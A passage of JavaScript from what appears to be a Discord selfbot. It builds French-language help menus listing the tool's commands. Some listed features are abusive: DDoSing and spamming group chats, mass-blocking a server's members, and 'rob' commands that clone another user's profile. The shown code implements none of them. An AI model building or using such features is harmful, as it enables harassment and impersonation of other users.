                message.edit(`ガ __**${name} - Friends**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}delete all friends${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime tous vos amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}friends send${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie un message à tous vos amis*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unblock all${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Débloque tous vos utilisateurs bloqués***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}friend invite${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un lien pour vous ajouter en ami*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}friend delete${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime tous vos liens d'amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}friend list${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche vos liens d'amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}addfriend (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute un utilisateur en ami***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}delfriend (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retire un utilisateur de vos amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}block (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Bloque un utilisateur discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unblock (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Débloque un utilisateur discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}acceptall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Accepte toutes vos demandes d'amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ignoreall${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ignore toutes vos demandes d'amis***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}bloackall (guildId)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Bloque tous les membres d'un serveur***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "notes"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Notes」`)
                .setDescription(`${prefix}create note ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧𝐞 𝐧𝐨𝐭𝐞
                ${prefix}edit note ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐮𝐧𝐞 𝐧𝐨𝐭𝐞 𝐝𝐞𝐣𝐚 𝐞𝐱𝐢𝐬𝐭𝐚𝐧𝐭𝐞
                ${prefix}list note ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐥𝐢𝐬𝐭𝐞 𝐝𝐞𝐬 𝐧𝐨𝐭𝐞𝐬
                ${prefix}show note ▸ 𝐄𝐧𝐯𝐨𝐢𝐞 𝐮𝐧𝐞 𝐧𝐨𝐭𝐞
                ${prefix}delete note ▸ 𝐒𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐮𝐧𝐞 𝐧𝐨𝐭𝐞 𝐬𝐚𝐮𝐯𝐞𝐠𝐚𝐫𝐝𝐞𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - Notes**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}create note (name) (texte)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée une note***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}edit note (note) (texte)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie une note déjà existante***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}list note${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche la liste des notes***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}show note (note)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Envoie une note***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}delete note (note)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Supprime une note sauvegardée***`.replaceAll('                ', ''))
            }
            

            else if (message.content === prefix + "logger"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Logger」`)
                .setDescription(`${prefix}setlogger ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫
                ${prefix}setwebhook ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞/𝐬𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐥𝐞 𝐰𝐞𝐛𝐡𝐨𝐨𝐤 𝐝𝐮 𝐥𝐨𝐠𝐠𝐞𝐫
                ${prefix}logsetup ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐩𝐨𝐮𝐫 𝐯𝐨𝐮𝐬
                ${prefix}setedit ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐝𝐞𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐦𝐨𝐝𝐢𝐟𝐢𝐞𝐬 (𝐃𝐌)
                ${prefix}setdelete ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐝𝐞𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐬𝐮𝐩𝐩𝐫𝐢𝐦𝐞𝐬 (𝐃𝐌)
                ${prefix}setghostping ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐝𝐞𝐬 𝐠𝐡𝐨𝐬𝐭𝐩𝐢𝐧𝐠𝐬
                ${prefix}setgroups ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐝𝐞𝐬 𝐠𝐫𝐨𝐮𝐩𝐞𝐬 𝐫𝐞𝐣𝐨𝐢𝐧𝐭𝐬/𝐪𝐮𝐢𝐭𝐭𝐞𝐬
                ${prefix}setguilds ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐝𝐞𝐬 𝐬𝐞𝐫𝐯𝐞𝐮𝐫𝐬 𝐫𝐞𝐣𝐨𝐢𝐧𝐭𝐬/𝐪𝐮𝐢𝐭𝐭𝐞𝐬
                ${prefix}sethypocrite ▸ 𝐀𝐜𝐭𝐢𝐯𝐞/𝐝𝐞𝐬𝐚𝐜𝐭𝐢𝐯𝐞 𝐥𝐞 𝐥𝐨𝐠𝐠𝐞𝐫 𝐝𝐞𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐜𝐨𝐧𝐭𝐞𝐧𝐚𝐧𝐭 𝐯𝐨𝐭𝐫𝐞 𝐩𝐬𝐞𝐮𝐝𝐨`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - Logger**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}setlogger (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setwebhook (url/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie/supprime le webhook du logger*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}logsetup${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Setup le logger pour vous*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setedit (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger des messages modifiés (DM)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setdelete (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger des messages supprimés (DM)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setghostping (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger des ghostpings***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setgroups (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger des groupes rejoints/quittés***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setguilds (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger des serveurs rejoints/quittés***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sethypocrite (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le logger des messages contenant votre pseudo***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "groupes"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Groupes」`)
                .setDescription(`${prefix}groupe name ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥𝐞 𝐧𝐨𝐦
                ${prefix}groupe icon ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥'𝐢𝐜𝐨𝐧𝐞
                ${prefix}creategroupe ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧 𝐠𝐫𝐨𝐮𝐩𝐞
                ${prefix}leavegrp ▸ 𝐐𝐮𝐢𝐭𝐭𝐞 𝐥𝐞 𝐠𝐫𝐨𝐮𝐩𝐞
                ${prefix}ddosgrp ▸ 𝐃𝐃𝐨𝐒 𝐮𝐧 𝐠𝐫𝐨𝐮𝐩𝐞
                ${prefix}lockgrp ▸ 𝐕𝐞𝐫𝐨𝐮𝐢𝐥𝐥𝐞 𝐮𝐧 𝐠𝐫𝐨𝐮𝐩𝐞
                ${prefix}sologrp ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧 𝐠𝐫𝐨𝐮𝐩𝐞 𝐬𝐞𝐮𝐥
                ${prefix}spamgrp ▸ 𝐒𝐩𝐚𝐦 𝐥𝐞𝐬 𝐠𝐫𝐨𝐮𝐩𝐞𝐬
                ${prefix}addgrp ▸ 𝐀𝐣𝐨𝐮𝐭𝐞 𝐮𝐧 𝐮𝐬𝐞𝐫
                ${prefix}creategroupe ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧 𝐠𝐫𝐨𝐮𝐩𝐞
                ${prefix}groupe owner ▸ 𝐃𝐨𝐧𝐧𝐞 𝐥𝐚 𝐜𝐨𝐮𝐫𝐨𝐧𝐧𝐞
                ${prefix}anti groupe ▸ 𝐌𝐨𝐝𝐢𝐟𝐢𝐞 𝐥'𝐚𝐧𝐭𝐢 𝐠𝐫𝐨𝐮𝐩𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                else message.edit(`ガ __**${name} - Groupes**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}groupe name${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le nom du groupe***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}groupe icon${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie l'icone du groupe***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}creategroupe (users)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un groupe avec les utilisateurs mentionner***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}leavegrp${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Quitte le groupe actuelle***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ddosgrp${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***DDoS un groupe discord*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}lockgrp${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche vos liens d'amis*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sologrp${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un groupe solo*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}spamgrp (user) (l)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Spam les créations de groupes (l pour quitter les groupes)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}addgrp (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute un utilisateur dans tous vos groupes discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}creategroupe (users)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée un groupe avec certains utilisateurs discord***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}groupe owner (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Donne la couronne du groupe à un utilisateur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}anti groupe (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Autorise ou non l'ajout de groupes*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}anti groupe discret (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active le fait de quitter un groupe discrètement*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}anti groupe message (message/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Défini le message à envoyer avant de quitter le groupe*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "antiraid"){
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}sanction (derank/kick/ban)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie la sanction lors d'un raid*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}secur (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Affiche/active/désactive la sécurité du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}protect${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active la sécurité du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unprotect${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Désactive la sécurité du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antichannel (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti channel***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antirole (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti role***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antikick (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti kick***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antiban (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti ban***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antibot (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti bot***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antiping (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti ping***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antiwebhook (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti antiwebhook***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antilink (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti link***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antidc (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti dc***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antispam (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti spam***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antimember (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti member role update***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}antiguild (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive l'anti guild update***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "gestion"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Gestion」`)
                .setDescription(`${prefix}autopublish ▸ 𝐏𝐮𝐛𝐥𝐢𝐞 𝐚𝐮𝐭𝐨 𝐮𝐧 𝐦𝐞𝐬𝐬𝐚𝐠𝐞
                ${prefix}autorole ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥'𝐚𝐮𝐭𝐨𝐫𝐨𝐥𝐞
                ${prefix}autoreact ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥'𝐚𝐮𝐭𝐨𝐫𝐞𝐚𝐜𝐭
                ${prefix}counter ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥𝐞𝐬 𝐜𝐨𝐮𝐧𝐭𝐞𝐫𝐬
                ${prefix}massrole ▸ 𝐃𝐨𝐧𝐧𝐞/𝐫𝐞𝐭𝐢𝐫𝐞 𝐮𝐧 𝐫𝐨𝐥𝐞
                ${prefix}prison ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥𝐚 𝐩𝐫𝐢𝐬𝐨𝐧
                ${prefix}unprison ▸ 𝐔𝐧𝐩𝐫𝐢𝐬𝐨𝐧 𝐮𝐧 𝐦𝐞𝐦𝐛𝐫𝐞
                ${prefix}piconly ▸ 𝐒𝐞𝐭𝐮𝐩 𝐮𝐧 𝐩𝐢𝐜𝐨𝐧𝐥𝐲
                ${prefix}savechat ▸ 𝐒𝐚𝐮𝐯𝐞𝐠𝐚𝐫𝐝𝐞 𝐥𝐞 𝐜𝐡𝐚𝐭
                ${prefix}soutiens ▸ 𝐃𝐨𝐧𝐧𝐞 𝐮𝐧 𝐫𝐨𝐥𝐞 𝐬𝐞𝐥𝐨𝐧 𝐥𝐞 𝐬𝐭𝐚𝐭𝐮𝐬
                ${prefix}gestion2 ▸ 𝐀𝐟𝐟𝐢𝐜𝐡𝐞 𝐥𝐚 𝐬𝐮𝐢𝐭𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`ガ __**${name} - Gestion**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}autopublish (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Publie automatiquement les annonces du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}autorole (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute/retire un rôle de l'auto role*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}autoreact (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute/retire un autoreact d'un salon du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}counter (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée/supprime un counter du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}massrole (type)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute/retire un rôle à des membres du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}prison (role/setup/sync)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le role prison/crée/met à jour les salons prisons*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}unprison (member)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Retire un membre de la prison*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}piconly (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute/retire un salon des piconly***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}savechat (channel)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Sauvegarde les messages d'un salon*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}soutiens (role/status)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le soutiens du serveur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rolemenu (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute/retire un rolemenu du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rolelimit (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Ajoute/supprime la limite d'un rôle*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}tempvoc (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée/supprime un vocale temporaire*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}ticket (add/remove)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Crée/supprime un système de ticket***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "gestion2"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Gestion II」`)
                .setDescription(`${prefix}rolemenu ▸ 𝐂𝐫𝐞𝐞 𝐮𝐧 𝐫𝐨𝐥𝐞𝐦𝐞𝐧𝐮
                ${prefix}rolelimit ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥𝐞 𝐫𝐨𝐥𝐞𝐥𝐢𝐦𝐢𝐭
                ${prefix}tempvoc ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥𝐞𝐬 𝐯𝐨𝐜𝐚𝐮𝐱 𝐭𝐞𝐦𝐩𝐨𝐫𝐚𝐢𝐫𝐞𝐬
                ${prefix}ticket ▸ 𝐒𝐞𝐭𝐮𝐩 𝐥𝐞𝐬 𝐭𝐢𝐜𝐤𝐞𝐭𝐬`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                    else embed.setImage(tools.image2 || api.helpgif)
                    if (tools.theme === "embed") return message.edit({embeds: [embed]})
    
            }

            else if (message.content === prefix + "profile"){
                message.edit(`ガ __**${name} - Profile**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}setname (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre pseudo***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setglobal (pseudo)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre pseudo globale (affiché)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setavatar (lien)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre photo de profile***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setbanner (lien)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre bannière (nitro seulement)***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setbio (texte)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre "A propos de moi"***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setpronom (texte)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie vos pronoms***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}sethypesquad (house)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie/supprime votre badge de la hypesquad*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}invisiblename${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre pseudo en invisible*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}junkname${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre pseudo en pseudo brute*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}invisiblepp${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie votre avatar en avatar invisible*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setdark${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Change votre thème en thème sombre***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setlight${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Change votre thème en thème éclairé***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}setcompact (on/off)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Active/désactive le mode compacte***`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "robber"){
                const embed = new discord.WebEmbed()
                .setColor(0x2B2D31)
                .setTitle(`「${name} Robber」`)
                .setDescription(`${prefix}robname ▸ 𝐕𝐨𝐥𝐞 𝐥𝐞 𝐩𝐬𝐞𝐮𝐝𝐨 𝐝'𝐮𝐧 𝐮𝐭𝐢𝐥𝐢𝐬𝐚𝐭𝐞𝐮𝐫
                ${prefix}robavatar ▸ 𝐕𝐨𝐥𝐞 𝐥'𝐚𝐯𝐚𝐭𝐚𝐫
                ${prefix}robbanner ▸ 𝐕𝐨𝐥𝐞 𝐥𝐚 𝐛𝐚𝐧𝐧𝐢𝐞𝐫𝐞
                ${prefix}robpronom ▸ 𝐕𝐨𝐥𝐞 𝐥𝐞𝐬 𝐩𝐫𝐨𝐧𝐨𝐦𝐬
                ${prefix}robbio ▸ 𝐕𝐨𝐥𝐞 𝐥𝐚 𝐛𝐢𝐨
                ${prefix}robhypesquad ▸ 𝐕𝐨𝐥𝐞 𝐥𝐞 𝐛𝐚𝐝𝐠𝐞 𝐡𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝
                ${prefix}rob ▸ 𝐕𝐨𝐥𝐞 𝐞𝐧𝐭𝐢è𝐫𝐞𝐦𝐞𝐧𝐭 𝐮𝐧 𝐩𝐫𝐨𝐟𝐢𝐥𝐞`.replaceAll("                ", ""))

                if (tools.thumb === true) embed.setThumbnail(tools.image || api.help)
                else embed.setImage(tools.image2 || api.helpgif)
                if (tools.theme === "embed") return message.edit({embeds: [embed]})

                message.edit(`ガ __**${name} - Robber**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}robname (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole le pseudo d'un utilisateur (globale)*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}robpronom (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole les pronoms d'un utilisateur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}robavatar (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole la photo de profile d'un utilisateur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}robbanner (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole la bannière d'un utilisateur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}robbio (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Vole la biographie d'un utilisateur"*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}robhypesquad (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Recopie le badge de la hypesquad d'un utilisateur*** ${client.premium ? "" : "|「Premium Requis」"}
                ${client.tools === "k3s" ? "" : "\`"}${prefix}rob (user)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Recopie exactement un utilisateur*** ${client.premium ? "" : "|「Premium Requis」"}`.replaceAll('                ', ''))
            }

            else if (message.content === prefix + "guilds"){
                message.edit(`ガ __**${name} - Guild**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}${prefix}gname (msg)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie le nom du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gavatar (img)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie l'avatar du serveur***
                ${client.tools === "k3s" ? "" : "\`"}${prefix}gbanner (img)${client.tools === "k3s" ? "" : "\`"} ${client.separator} ***Modifie la bannière du serveur***
